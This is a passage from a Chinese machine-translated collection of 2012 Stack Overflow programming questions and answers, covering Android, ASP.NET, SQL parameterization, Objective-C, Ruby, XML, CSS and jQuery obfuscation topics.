最后一点，子类通常是不好的做法`Thread`。改为实现 Runnable 是更好的做法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T17:04:11.447

你不是在创建你的`Sculpture`. 呼叫应如下所示`new Sculpture().new ScreenThread()`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-22T17:05:08.167

看起来你只是忘记了 () 之后`new Sculpture`？

# asp.net-mvc - 无法让 MvcIntegrationTestFramework 工作

> ID：10270030
> 
> 赞同：4
> 
> 时间：2012-04-22T17:00:47.640
> 
> 标签：asp.net-mvc, integration-testing, mstest

我正在尝试让 Steven Sanderson 的[MvcIntegrationTestFramework](http://blog.stevensanderson.com/2009/06/11/integration-testing-your-aspnet-mvc-application/)与我们的 MVC 4 应用程序一起工作。我真的很喜欢能够编写不需要浏览器但测试整个流程的集成测试的想法。

我不能让它运行。当我执行一个非常简单的测试时，我得到的是：

> 无法创建类 website.tests.UnitTest1 的实例。错误：System.InvalidOperationException：无法在 C:[path]\Website 下的 bin 目录中加载 MvcIntegrationTestFramework.dll。这是您的 ASP.NET MVC 应用程序的路径吗？您是否设置了构建后事件以将测试程序集及其依赖项复制到此文件夹？有关示例，请参见演示项目。

这是 MVC 应用程序的正确路径，我已将测试项目放在解决方案的旁边。我还设置了构建后复制字符串，它复制了我通过查看 MVC 应用程序 bin 文件夹来验证的 .dll 文件。它仍然声称它找不到`MvcIntegrationTestFramework.dll`

我使用 MSTest 作为测试框架。

有谁知道如何解决这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T13:47:57.867

此版本已针对 MVC3 进行了更新，到目前为止，我的结果相当不错：

[https://github.com/JonCanning/MvcIntegrationTestFramework](https://github.com/JonCanning/MvcIntegrationTestFramework)

我也分叉了这个并添加了对文件上传的支持。

[https://github.com/Steji/MvcIntegrationTestFramework](https://github.com/Steji/MvcIntegrationTestFramework)

# c++ - 水平线的类型是什么？

> ID：10270032
> 
> 赞同：0
> 
> 时间：2012-04-22T17:01:06.703
> 
> 标签：c++, qt

Qt中水平线的类型是什么？我正在尝试将此小部件添加到另一个小部件上，但我无法找到它的类型。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T17:08:17.123

您正在寻找的似乎只是一个[QFrame](http://qt-project.org/doc/qt-4.8/qframe.html)。使用[setFrameShape()](http://qt-project.org/doc/qt-4.8/qframe.html#frameShape-prop)您可以将其形状设置为[QFrame::HLine](http://qt-project.org/doc/qt-4.8/qframe.html#Shape-enum)。那应该可以实现您正在寻找的东西。

# asp.net - 带有动画标签的 ModalPopUpExtender

> ID：10270039
> 
> 赞同：0
> 
> 时间：2012-04-22T17:01:22.957
> 
> 标签：asp.net, ajax

我有一个问题，我正在我的网页中创建一个 ModelPopUpExtender 控件。它在没有动画标签的情况下运行良好，但是当我在其中添加动画标签时，它返回错误，因为“ **TargetControlID =“Button2”上的动画使用不存在或无法设置的属性 AjaxControlToolkit.ModalPopupExtender.OnShowing** ”

我不知道为什么它会返回这种类型的错误？请向我建议任何有关相同的解决方案。

提前致谢。

**代码：**

```
 <asp:ModalPopupExtender ID="ModalPopupExtender2" runat="server" TargetControlID="Button2" CancelControlID="Button4" PopupDragHandleControlID="Panel2" DropShadow="true">
         <Animations>
                <OnShowing>
                <FadeIn Duration=".5" Fps="30" />
            </OnShowing>
            <OnShown>
                <FadeIn Duration=".5" Fps="30" />
            </OnShown>
            <%-- neither animation works from code-behind --%>
            <OnHiding>
                <FadeOut Duration=".5" Fps="30" />
            </OnHiding>
            <OnHidden>
                <FadeOut Duration=".5" Fps="30" />
            </OnHidden>

            </Animations>
        </asp:ModalPopupExtender> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-03-07T04:40:57.997

```
<Animations>
 <OnShown><Fadein Duration="0.50" /></OnShown>
        <OnHiding><Fadeout Duration="0.75" /></OnHiding>
</Animations> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-03-09T04:29:47.437

```
<asp:ModalPopupExtender runat="server" ID="ModalPopupExtender2" TargetControlID="Button2"
                            PopupControlID="Panel2"
                            DropShadow="true"
                            BackgroundCssClass="modalBackground"
                             CancelControlID="Button4">

<Animations>
 <OnShown><Fadein Duration="0.50" /></OnShown>
 <OnHiding><Fadeout Duration=".05" /></OnHiding>
 </Animations>
</asp:ModalPopupExtender>

<asp:Panel runat="server" ID="PnlDesignation"  ScrollBars="Auto" CssClass="loginpnl" style="display:none">

     <div class="closepop text-right" id="Button4" > </div>

</asp:Panel> 
```

CSS

```
.modalBackground
{
background-color: #000;
filter: alpha(opacity=70);
opacity: 0.70;
}

.closepop  
{
margin:0 0 0 20px;
BACKGROUND: url(../images/close.png) no-repeat 0 0;
 WIDTH:26px;POSITION: relative; background-position:right;
HEIGHT: 26px; 
cursor:pointer;
z-index: 100000;
 float:right;
} 
```

# android - 在 ListFragment 中填充自定义视图时出现 Android U_MISSING_RESOURCE_ERROR

> ID：10270041
> 
> 赞同：4
> 
> 时间：2012-04-22T17:01:40.617
> 
> 标签：android

我试图结合这两个源代码（http://stackoverflow.com/questions/9697716/listview-displays-each-item-twice-after-filtering 和[http://android.codeandmagic.org/2011/07/android -tabs-with-fragments/](http://android.codeandmagic.org/2011/07/android-tabs-with-fragments/) ) 以创建两个选项卡，其中一个具有带搜索框的列表视图。

```
public class TabsFragment extends Fragment implements OnTabChangeListener {

private static final String TAG = "FragmentTabs";
public static final String TAB_ALLSERVICES = "allservices";
public static final String TAB_MOSTUSEDSERVICES = "mostusedservices";

private View mRoot;
private TabHost mTabHost;
private int mCurrentTab;

@Override
public void onAttach(Activity activity) {
    super.onAttach(activity);
}

@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container,
        Bundle savedInstanceState) {
    mRoot = inflater.inflate(R.layout.tabs_fragment, null);
    mTabHost = (TabHost) mRoot.findViewById(android.R.id.tabhost);
    setupTabs();
    return mRoot;
}

@Override
public void onActivityCreated(Bundle savedInstanceState) {
    super.onActivityCreated(savedInstanceState);
    setRetainInstance(true);

    mTabHost.setOnTabChangedListener(this);
    mTabHost.setCurrentTab(mCurrentTab);
    // manually start loading stuff in the first tab
    updateTab(TAB_ALLSERVICES, R.id.tab_1);
}

private void setupTabs() {
    mTabHost.setup(); // important!
    mTabHost.addTab(newTab(TAB_ALLSERVICES, R.string.tab_allservices,
            R.id.tab_1));
    mTabHost.addTab(newTab(TAB_MOSTUSEDSERVICES,
            R.string.tab_mostusedservices, R.id.tab_2));
}

private TabSpec newTab(String tag, int labelId, int tabContentId) {
    Log.d(TAG, "buildTab(): tag=" + tag);

    View indicator = LayoutInflater.from(getActivity()).inflate(
            R.layout.tab,
            (ViewGroup) mRoot.findViewById(android.R.id.tabs), false);
    ((TextView) indicator.findViewById(R.id.text)).setText(labelId);

    TabSpec tabSpec = mTabHost.newTabSpec(tag);
    tabSpec.setIndicator(indicator);
    tabSpec.setContent(tabContentId);
    return tabSpec;
}

@Override
public void onTabChanged(String tabId) {
    Log.d(TAG, "onTabChanged(): tabId=" + tabId);
    if (TAB_ALLSERVICES.equals(tabId)) {
        updateTab(tabId, R.id.tab_1);
        mCurrentTab = 0;
        return;
    }
    if (TAB_MOSTUSEDSERVICES.equals(tabId)) {
        updateTab(tabId, R.id.tab_2);
        mCurrentTab = 1;
        return;
    }

}

private void updateTab(String tabId, int placeholder) {
    FragmentManager fm = getFragmentManager();
    if (fm.findFragmentByTag(tabId) == null) {
        if (tabId.equals(TAB_MOSTUSEDSERVICES)) {
            fm.beginTransaction()
                    .replace(placeholder, new MostUsedServicesFragment(), tabId)
                    .commit();
        } else if (tabId.equals(TAB_ALLSERVICES)) {
            fm.beginTransaction()
            .replace(placeholder, new Fragmenttest(), tabId)
            .commit();
        }
    }
}
}

tabs_fragment.xml looks like following:
<?xml version="1.0" encoding="utf-8"?>
<TabHost
xmlns:android="http://schemas.android.com/apk/res/android"
android:id="@android:id/tabhost"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:background="#EFEFEF">

<LinearLayout
    android:orientation="vertical"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent">

    <TabWidget
        android:id="@android:id/tabs"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content" />

        <FrameLayout
            android:id="@android:id/tabcontent"
            android:layout_width="fill_parent"
            android:layout_height="fill_parent">

            <FrameLayout
                android:id="@+id/tab_1"
                android:layout_width="fill_parent"
                android:layout_height="fill_parent" />

            <FrameLayout
                android:id="@+id/tab_2"
                android:layout_width="fill_parent"
                android:layout_height="fill_parent" />

        </FrameLayout>
</LinearLayout>
</TabHost>

public class Fragmenttest extends ListFragment {
ListView newReqList;
LayoutInflater inflater;
String[] from = new String[] { "mainrow", "subrow" };
EditText searchBar = null;
ArrayAdapter<String> sAdapter = null;
private static final String[] NUMBERS = { "1", "2", "3", "4", "5", "VI",
        "VII", "VIII", "IX", "X", "XI", "XII", "XIII", "XIV", "XV" };

public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
}

public void onActivityCreated(Bundle savedInstanceState) {
    super.onActivityCreated(savedInstanceState);

    newReqList = this.getListView();

    searchBar = (EditText) this.getActivity().findViewById(R.id.search_box);
    List<String> l = new ArrayList<String>();

    for (String s : NUMBERS) {
        l.add(s);
    }
    sAdapter = new ArrayAdapter<String>(this.getActivity(),
            R.layout.list_item, l);
    newReqList.setAdapter(sAdapter);
    searchBar.addTextChangedListener(filterTextWatcher);
}

private TextWatcher filterTextWatcher = new TextWatcher() {

    public void afterTextChanged(Editable s) {
    }

    public void beforeTextChanged(CharSequence s, int start, int count,
            int after) {
    }

    public void onTextChanged(CharSequence s, int start, int before,
            int count) {
        sAdapter.getFilter().filter(s);
        sAdapter.notifyDataSetChanged();
    }

};

public View onCreateView(LayoutInflater inflater, ViewGroup container,
        Bundle savedInstanceState) {
    View v = inflater.inflate(R.layout.allservices, container, false);
    return v;
}
} 
```

allservices.xml 看起来像：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:orientation="vertical" >

<!-- Pretty hint text, and maxLines -->

<EditText
    android:id="@+id/search_box"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:hint="@string/allserviceshint"
    android:inputType="text"
    android:maxLines="1" />

<!-- Set height to 0, and let the weight param expand it -->
<!--
     Note the use of the default ID! This lets us use a 
     ListActivity still!
-->

<ListView
    android:id="@android:id/list"
    android:layout_width="fill_parent"
    android:layout_height="0dip"
    android:layout_weight="1" />
</LinearLayout> 
```

一旦我运行应用程序，我就会得到以下 LogCat：

```
04-19 04:59:04.276: E/AndroidRuntime(4106): FATAL EXCEPTION: main
04-19 04:59:04.276: E/AndroidRuntime(4106): java.lang.RuntimeException: U_MISSING_RESOURCE_ERROR 
```

有谁知道这意味着什么以及我该如何解决？

最好的问候，罗马。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T17:48:37.923

我通过将 allservices.xml 更改为以下内容来解决问题：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:background="@android:drawable/gallery_thumb"
android:orientation="vertical" >

<EditText
    android:id="@+id/search"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:hint="Hallo"
    android:inputType="text"
    android:maxLines="1" />

<FrameLayout
    android:layout_width="match_parent"
    android:layout_height="0dip"
    android:layout_weight="1" >

    <ListView
        android:id="@android:id/list"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:drawSelectorOnTop="false" />

    <TextView
        android:id="@android:id/empty"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:text="No items."
        android:textAppearance="?android:attr/textAppearanceMedium" />
</FrameLayout>
</LinearLayout> 
```

添加 Framelayout 就可以了。我认为如果没有 FrameLayout，Listview 会使 Edittext 消失，因此抛出了 U_MISSING_RESOURCE_ERROR。

# android - 拖动和释放触摸后发射球

> ID：10270049
> 
> 赞同：0
> 
> 时间：2012-04-22T17:02:39.263
> 
> 标签：android

我正在尝试拖动并发射弹丸，例如愤怒的小鸟。拖动部分工作正常，但是当我释放触摸（即 ACTION_UP）时，有时球会立即在边界处结束，而其他时候，它会因 StackOverflowError 而崩溃。我应该怎么做才能避免错误并使运动平稳？这是我的代码：

```
public class BallView extends View{

static Log log;
Bitmap ball;
float xStart;
float yStart;
float xCurrent;
float yCurrent;
int xMax;
int yMax;
float xVector;
float yVector;

public BallView(Context context){
    super(context);
    this.setFocusable(true);
    ball = BitmapFactory.decodeResource(getResources(), R.drawable.ball);
    xStart = 125;
    yStart = 275;
    xCurrent = xStart;
    yCurrent = yStart;
}

@Override
protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
    xMax = MeasureSpec.getSize(widthMeasureSpec);
    yMax = MeasureSpec.getSize(heightMeasureSpec);
    setMeasuredDimension(xMax, yMax);
}

@Override
protected void onDraw(Canvas canvas) {
    canvas.drawBitmap(ball, xCurrent, yCurrent, null);
}

@Override
public boolean onTouchEvent(MotionEvent event) {
    int eventaction = event.getAction();
    int X = (int)event.getX(); 
    int Y = (int)event.getY(); 

    switch (eventaction ) {
    case MotionEvent.ACTION_DOWN:
        break;
    case MotionEvent.ACTION_MOVE:
        xCurrent = X-30;
        yCurrent = Y-30;
        break; 

    case MotionEvent.ACTION_UP:
        Log.d("actionup", "done");
        xCurrent = X-30;
        yCurrent = Y-30;
        xVector = xStart-xCurrent;
        yVector = yStart-yCurrent;
        break;
    } 
    invalidate();
    if (eventaction == MotionEvent.ACTION_UP){
        launch(xVector, yVector);
    }
    return true; 
}

private void launch(float xVector, float yVector) {
    xCurrent = xCurrent + xVector;
    yCurrent = yCurrent + yVector;
    if (xCurrent < 0 || xCurrent > xMax || yCurrent < 0 || yCurrent >yMax){
        return;
    }
    invalidate();
    launch(xVector, yVector);
}
} 
```

任何帮助表示赞赏。谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T17:17:42.890

嗯，没有来自错误跟踪的特定信息：StackOverFlow 错误通常与失控的递归函数一起发生。对你来说，`launch()`如果 xCurrent = 0、xMax = 1000000 和 xVector = .001，你*可能会*创建一个 stackoverflow。我会从这里开始调试。

此外，您似乎在同一范围内声明了具有相同名称的变量（即 xVector 和 yVector 作为类成员变量，并且它们也在 中声明`launch(float xVector, float yVector)`）。这可能会使您或其他任何人感到困惑。尝试使用不同的变量名称和常规命名方案。

最后，一个有用的运算符是`+=`，它需要：

`xCurrent = xCurrent + xVector;`

并将其缩短为：

`xCurrent += xVector;`

这可以为您节省一些不必要的打字。祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T17:44:54.760

似乎您的`launch()`方法是一个糟糕的递归调用。看到这个[答案](https://stackoverflow.com/a/214758/971070)。

```
private void launch(float xVector, float yVector) {
    new Thread(new Runnable() {

        @Override
        public void run() {
            while (!(xCurrent + xVector < 0 || xCurrent + xVector > xMax || 
                    yCurrent + yVector < 0 || yCurrent + yVector > yMax)){

                xCurrent = xCurrent + xVector;
                yCurrent = yCurrent + yVector;
                try{
                    Thread.sleep(200);
                }catch(Exception e){
                }
                postInvalidate();
            }
        }
    }).start;
} 
```

# c# - C# ASP.NET SQL 参数化

> ID：10270050
> 
> 赞同：0
> 
> 时间：2012-04-22T17:02:48.640
> 
> 标签：c#, sql, parameters

我已经看到了一些如何使用参数来避免字符转义的示例。使用参数对 SQL 注入是否 100% 安全？

另外，您能否提供一些基本查询（经常使用），以及您如何实现参数？

我来这里之前搜索的一些网站提供了过于复杂的示例。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T17:06:36.587

参数化 SQL 查询的基本示例如下：

```
SqlCommand command = new SqlCommand(@"select city from users where username = @username", conn);
SqlParameter param = new SqlParameter();
param.ParameterName = "@username";
param.Value = "abc123"
command.Parameters.Add(param); 
```

`conn`是您建立的 SqlConnection。

`@username`是执行命令时将被替换的参数名称。

`abc123`是我为示例添加的用户名。

这显然是一个虚构的场景，但你明白了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T17:19:21.247

作为较短的版本，您可以使用

```
SqlCommand command = new SqlCommand(@"select city from users where username = @username", conn);
command.Parameters.AddWithValue("@username", "value"); 
```

# objective-c - 是否有类似以下功能的类（功能、方法等或任何功能）？

> ID：10270051
> 
> 赞同：0
> 
> 时间：2012-04-22T17:02:56.967
> 
> 标签：objective-c

是否有类似以下功能的类（功能、方法等或任何功能）？

受孕的例子）

一个使所有案例组合的类。

```
 NSString *sourceString = [[NSString alloc] initWithString:@"ABC"];
    NSArray *sourceArray = [[NSArray alloc] initWithObjects:@"A", @"B", @"C"];

    someClass *someClass1 = [[someClass alloc] init];

    NSString *caseResultAsString = [someClass1 makeAllCaseCombinationToStr:sourceString pair:2];
    NSArray *caseResultAsArray = [someClass1 makeAllCaseCombinationToArray:sourceArray pair:2]; 
```

caseResultAsString 的值为“AA AB AC BA BB BC CA CB CC”（对参数为 2）

caseResultAsArray 的值为 {"AA", "AB", "AC", "BA", "BB", "BC", "CA", "CB", "CC"}

如果输入源和输出结果是任何类型或任何方式，都没有关系。

我想知道是否有一个具有上述概念特征的类。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T17:22:44.557

这是一个非常简单的`NSSet`类别：

```
@interface NSSet(Permutations)

-(NSSet *) setWithPermuations:(int) n;

@end

@implementation NSSet(Permutations)

// data should be NULL the first time through
static void for_loop(int count, int levels, void (^block)(int *levels), int *data)
{
    int freeData = 0;
    if (!data)
    {
        data = malloc(sizeof(int) * levels);
        freeData = 1;
    }

    for (int i = 0; i < count; i++) {
        data[levels - 1] = i;

        if (levels)
            for_loop(count, levels - 1, block, data);
        else {
            if (block)
                block(data);
        }
    }

    if (freeData)
        free(data);
}

-(NSSet *) setWithPermuations:(int)n
{
    NSMutableArray *returnArray = [NSMutableArray array];
    NSArray *thisArray = [self allObjects];

    for_loop(thisArray.count, n, ^(int *levels) {
        NSMutableString *concat = [NSMutableString string];

        for (int i = 0; i < n; i++) {
            [concat appendFormat:@"%@", [thisArray objectAtIndex:levels[i]]];
        }

        [returnArray addObject:concat];

    }, NULL);

    return [NSSet setWithArray:returnArray];
}

@end 
```

显然，该算法的时间是`O((N^T) + O(N))`，其中`N`是集合中的元素，`T`是每次渗透的对象数。如果您愿意，可以轻松地将其更改为具有 NSArrays 的 NSSet，但目前这仅使用一个字符串。

# android - 从 AlarmManager 创建一个对话框？

> ID：10270052
> 
> 赞同：0
> 
> 时间：2012-04-22T17:03:05.127
> 
> 标签：android

我已经使用 AlarmManager 安排了一个警报，它会触发一个 BroadcastReceiver。在广播接收器内部，我想调用一个 Activity 并创建一个弹出对话框。

这里重要的是我想查看用户所在位置的背景，而不是先将我的应用程序放在前面。看看下面的代码：

```
Intent intent = new Intent(context, AlarmActivity.class);
intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
context.startActivity(intent); 
```

现在发生了我不希望发生的事情： 1\. 用户正在查看我的应用程序 2\. 用户按下主页，现在在其他应用程序中 3\. 我的应用程序仍在后台运行 4\. 警报触发器->BroadcastReceiver- >上述意图启动 5\. 用户现在正在查看我的应用程序的最后一页和我的弹出对话框

我想要的是： 5\. 用户仍在查看他们所在的任何应用程序，但他们现在有我的弹出对话框。

如何在不将我的应用程序放在前面的情况下调用活动？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T17:29:54.443

Luksprog 说的是真的，但是当时间对应于您的警报设置时，即使是默认警报也会显示 AlertDialog。您可以将此代码放入您的其他代码中，该代码在您的警报启动时执行它的操作：

```
 public void alertBtn1 (View v){
        new AlertDialog.Builder(this)
            .setTitle("AlertDialog")
            .setMessage(R.string.text OR "YOURTEXTHERE")
    // If you want to the user to have multiple options, you can replace this
            .setNeutralButton("YOURTEXTHERE", null)
    // with this:               
            .setNeutralButton("YOURTEXTHERE", null)
            .setPositiveButton("YOURTEXTHERE", new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
    // finish(); or whatever you like to happen when the user clicks the button.
                    finish();
                    }
                })
            .show();

    } 
```

# iphone - 是否可以处理 Apple 通知消息？

> ID：10270054
> 
> 赞同：1
> 
> 时间：2012-04-22T17:03:13.023
> 
> 标签：iphone, objective-c, apple-push-notifications

我需要知道是否可以在 iPhone 用户阅读之前处理 Apple 通知消息？

我在这里要做的是，我想在用户看到 AlertView 等之前过滤消息。因为我的服务器将在负载中发送隐藏消息，以便稍后调用其他服务

非常感谢你

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T17:14:49.583

您不能在您的应用程序之外执行此操作。Apple 在其他应用程序之前将消息传递给用户。只有当用户决定打开警报时，您才能触摸它。

如果用户在您的应用程序内收到消息，您可以执行此操作（在这种情况下，无论如何都没有警报消息）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T17:51:09.247

如果您的应用程序处于活动/前台状态，您当然可以做您想做的事情。在这个阶段，您的 appdelegate`didreceiveremotenotification`会使用通知负载调用，您可以在那里过滤您想要的任何内容。

在其他情况下 - 当应用程序不在前台时，您无法过滤 PUSH 通知消息框，因为它是由 iOS 生成的。

我希望这能澄清你对 APNS 的理解。

# ruby-on-rails - 如何覆盖这个 Ruby 变量？

> ID：10270056
> 
> 赞同：2
> 
> 时间：2012-04-22T17:03:18.367
> 
> 标签：ruby-on-rails, ruby

原始代码如下所示：

```
module Acme
  class Address
    STREET_NAME = "123 acme inc drive".freeze

    ..
    ..
  end
end 
```

这是一个第 3 方 gem，我希望我可以`STREET_NAME`以某种方式修改初始化程序中的变量，而无需编辑源代码。这可能吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-22T17:11:04.037

只需重新分配它：

```
Acme::Address::STREET_NAME = "1 Infinite Loop" 
```

冻结一个对象只是冻结：*对象*，而不是变量（引用）本身。重新分配一个常量会给你一个警告：

> 警告：已经初始化的常量`STREET_NAME`

因为重新分配常量通常不是一个好主意——但这是 Ruby，因为一切都是动态的，所以常量并不是真正的常量。在初始化程序中执行此操作应该可以正常工作。

# xml - VB.net 中的 XML 编辑

> ID：10270058
> 
> 赞同：0
> 
> 时间：2012-04-22T17:03:27.150
> 
> 标签：xml, vb.net

尝试在 vb 中编辑 xml 文件后出现 2 个问题，我试图找到答案，但那些没有按预期工作，我想要实现的是对于那些具有负数的 transport_orders，替换负值其正数。请记住，这些值是一个带有 2 位小数的数字，并且它的正数应该保持相同的格式。

源 xml 如下所示：

```
<transport_orders>
<transport_order>
<id>NOCCO/12-006798_1</id>
<order_number>NOCCO/12-006798_1</order_number>
<order_date>2012-03-30</order_date>
<contactId>C04396</contactId>
<productId>0103-01101025</productId>
<sum>3135.51</sum>
<currency_code></currency_code>
<reference>NOCCO/12-006798</reference>
<amounts>
<amount>
<unit_code>kg</unit_code>
<value>-324.00</value>
</amount>
</amounts>
<pickup_task>
<addressid>BUCU</addressid>
<task_window>
<from_instant>2012-04-20T18:26:43</from_instant>
<till_instant>2012-04-20T18:26:43</till_instant>
</task_window>
</pickup_task>
<delivery_task>
<addressid>C04396_1</addressid>
<task_window>
<from_instant>2012-04-23T00:00:00</from_instant>
<till_instant>2012-04-24T00:00:00</till_instant>
</task_window>
</delivery_task>
</transport_order>
<transport_order>
... 
```

1.  我尝试的是下面的代码，但我认为我遗漏了一些东西，因为该值是一个带有 2 位小数的数字，而我得到的唯一结果是 324 我得到 32400

    element.Element("amounts").Element("amount").Element("value").decimal("n2") = -element.Element("amounts").Element("amount").Element("价值”).价值

2.  我怎样才能从 2012-04-20T18:26:43 只替换日期或只替换开胃时间，例如我想用送货任务时间窗口的日期编辑提货任务的时间窗口-从即时日期-直到瞬间，但保持时间（小时，分钟，秒）不变。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T17:22:54.900

```
 Dim doc = <transport_orders>
                  <transport_order>
                      (...)
                  </transport_order>
              </transport_orders>

    Dim culture = New CultureInfo("en")

    Dim negativeAmmounts = (From item In doc.Descendants("value")
                           Let value = Double.Parse(item.Value, culture)
                           Where value < 0
                           Select New With {
                               .Item = item,
                               .Value = value
                           }).ToList()

    negativeAmmounts.ForEach(Sub(e) e.Item.Value = -1 * e.Value) 
```

之后，您可以检查是否所有值都被替换，例如将整个文档打印到字符串中：

```
 Dim outerXml = doc.ToString() 
```

# iphone - stringByReplaceing，有例外吗？

> ID：10270060
> 
> 赞同：3
> 
> 时间：2012-04-22T17:03:59.383
> 
> 标签：iphone, ios, cocoa-touch

假设我有字符串：

```
@"(Mg(Ni+(N(O2)3"; 
```

我想知道是否可以替换字符串“（”的出现，但“+（”除外。因此结果；

```
@"+Mg+Ni+(N+O2)3"; 
```

我该怎么做呢？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-22T17:16:21.707

[您可以使用正则表达式](http://en.wikipedia.org/wiki/Regular_expression)进行这种更复杂的字符串替换。

您可以使用[否定的lookbehind](http://www.regular-expressions.info/lookaround.html)来编写表达式以查找`(`前面*没有a 的*a `+`（尽管在这种情况下有更简单的替代方案，请参阅@sch 的评论）。

例子：

```
NSString *string = @"(Mg(Ni+(N(O2)3";
NSLog(@"Original string: %@", string);
NSString *pattern = @"(?<!\\+)\\(";
NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:pattern options:0 error:NULL];   
NSString *modifiedString = [regex stringByReplacingMatchesInString:string 
                                                           options:0
                                                             range:NSMakeRange(0, [string length])
                                                      withTemplate:@"$1+"];
NSLog(@"After replacement: %@", modifiedString); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-22T17:16:05.887

[在此处](https://stackoverflow.com/a/1633830/986169)阅读有关正则表达式的类似问题

您还可以在没有正则表达式的情况下作为快速修复执行以下操作（适用于您的示例中的简单格式化字符串）：

1.  全部替换`+(`为`[`
2.  全部替换`(`为`+`
3.  全部替换`[`为`+)`

我认为`[`这不是您的字符串语法的一部分。（如果是使用不使用的）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-22T17:17:22.403

有一个`NSRegularExpressionClass`提供以下方法：

```
-(NSString *)stringByReplacingMatchesInString:(NSString *)string options:(NSMatchingOptions)options range:(NSRange)range withTemplate:(NSString *)template 
```

这可能就是你想要的。

# objective-c - 关闭子视图

> ID：10270074
> 
> 赞同：0
> 
> 时间：2012-04-22T17:05:13.410
> 
> 标签：objective-c, xcode

我在 FirstViewController 中有这样的代码

```
{
SecondViewController *objComing=[[SecondViewController alloc] init];
[self.view addSubview:objComing.view];

objComing.view.backgroundColor=[UIColor blueColor];

objComing.view.frame=CGRectMake(0,420, 320, 0);
[UIView beginAnimations:nil context:nil];
[UIView setAnimationDuration:0.5];

[UIView setAnimationCurve:UIViewAnimationCurveEaseIn];
objComing.view.frame=CGRectMake(0,0, 320, 420);

[UIView commitAnimations];
} 
```

SecondViewController 包含关闭/关闭按钮。应该如何查看连接到按钮的 IBAction（包含在 SecoundViewController 中）以解除/删除和隐藏此覆盖层？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T17:10:39.460

在关闭/关闭按钮方法中添加以下行以删除 secondviewcontroller 子视图：

```
[self.view removeFromSuperview]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T17:12:11.370

[self.view removeFromSuperview];

# html - 图像高度和宽度不起作用？

> ID：10270075
> 
> 赞同：23
> 
> 时间：2012-04-22T17:05:26.417
> 
> 标签：html, css, wordpress, xhtml

在这篇文章中，我设置了图像的高度和宽度，并且在 HTML 中可以清楚地看到..

[删除网址]

但是浏览器或 Wordpress 导致图像保持相同大小。

我想让它变小吗？

* * *

## 回答 #1

> 赞同：80
> 
> 时间：2012-04-22T17:09:30.490

你必须写

```
<img src="theSource" style="width:30px;height:auto;" /> 
```

内联样式总是优先于 CSS 样式。您的样式表会覆盖宽度和高度**属性**，因此您需要切换到这种格式。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-04-22T17:15:49.380

您的 CSS 上有一个类覆盖了您的宽度和高度，该类的内容如下：

```
.postItem img {
    height: auto;
    width: 450px;
} 
```

删除它，`img`标签上的宽度/高度属性应该可以工作。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-22T18:52:39.843

[http://www.markrafferty.com/wp-content/w3tc/min/7415c412.e68ae1.css](http://www.markrafferty.com/wp-content/w3tc/min/7415c412.e68ae1.css)

第 11 行：

```
.postItem img {
    height: auto;
    width: 450px;
} 
```

你可以编辑你的 CSS，或者你可以听 Mageek 并使用**INLINE STYLING**来覆盖正在发生的 CSS 样式：

```
<img src="theSource" style="width:30px;" /> 
```

避免同时设置宽度和高度，因为图像本身可能不会按比例缩放。但是您可以根据 Mageek 的示例将尺寸设置为您想要的任何尺寸。

# jquery - 如何在 Asp.NET MVC3 中使用混淆的 Jquery 脚本？

> ID：10270076
> 
> 赞同：0
> 
> 时间：2012-04-22T17:05:29.100
> 
> 标签：jquery

例如，如果我想混淆我的代码

```
 <script>
$(document).ready(function(){
   $("a").click(function(event){
     alert("Thanks for visiting!");
   });
 });
</script> 
```

在 jsobfuscate.com 中混淆后，我得到以下代码

```
eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('$(4).3(0(){$("2").1(0(5){8("7 6 9!")})});',10,10,'function|click|a|ready|document|event|for|Thanks|alert|visiting'.split('|'),0,{})) 
```

